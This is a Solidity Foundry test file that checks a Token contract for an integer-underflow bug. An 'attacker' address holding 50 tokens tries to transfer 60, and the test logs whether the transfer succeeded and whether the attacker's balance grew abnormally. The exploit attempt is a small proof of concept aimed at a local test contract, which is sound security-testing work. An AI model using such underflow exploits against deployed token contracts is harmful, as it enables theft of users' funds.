// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/token.sol";

contract TokenUnderflowTest is Test {
    Token token;
    address attacker = address(0x1);
    address receiver = address(0x2);
    bool public transferSuccess;

    function setUp() public {
        token = new Token(100);
        token.transfer(attacker, 50);
    }

    function testTransferUnderflow() public {
        console2.log("--- BEFORE-Trigger Transfer ---");
        uint256 attackerBalanceBefore = token.balanceOf(attacker);
        uint256 receiverBalanceBefore = token.balanceOf(receiver);
        uint256 deployerBalanceBefore = token.balanceOf(address(this));

        console2.log("Attacker balance:", attackerBalanceBefore);
        console2.log("Receiver balance:", receiverBalanceBefore);
        console2.log("Deployer balance:", deployerBalanceBefore);

        console2.log("--- Trigger TransferUnderflow ---");
        vm.startPrank(attacker);
        (transferSuccess, ) = address(token).call(
            abi.encodeWithSelector(token.transfer.selector, receiver, 60)
        );
        vm.stopPrank();
        console2.log("Transfer result:", transferSuccess ? "Success" : "Reverted");

        console2.log("--- AFTER-Trigger Transfer ---");
        uint256 attackerBalanceAfter = token.balanceOf(attacker);
        uint256 receiverBalanceAfter = token.balanceOf(receiver);
        uint256 deployerBalanceAfter = token.balanceOf(address(this));

        console2.log("Attacker balance:", attackerBalanceAfter);
        console2.log("Receiver balance:", receiverBalanceAfter);
        console2.log("Deployer balance:", deployerBalanceAfter);

        console2.log("--- Differential Result ---");
        bool balanceAnomaly = attackerBalanceAfter > attackerBalanceBefore;
        bool exploitDetected = transferSuccess && balanceAnomaly;
        
        console2.log("Anomaly detected?", balanceAnomaly ? "YES" : "NO");
        console2.log("Exploit successful?", exploitDetected ? "YES" : "NO");

        if (exploitDetected) {
            console2.log("Vulnerability Exists: transfer succeeded and attacker balance increased abnormally");
        } else {
            console2.log("Vulnerability not Exist: either transfer failed or balance didn't increase abnormally");
        }
    }
}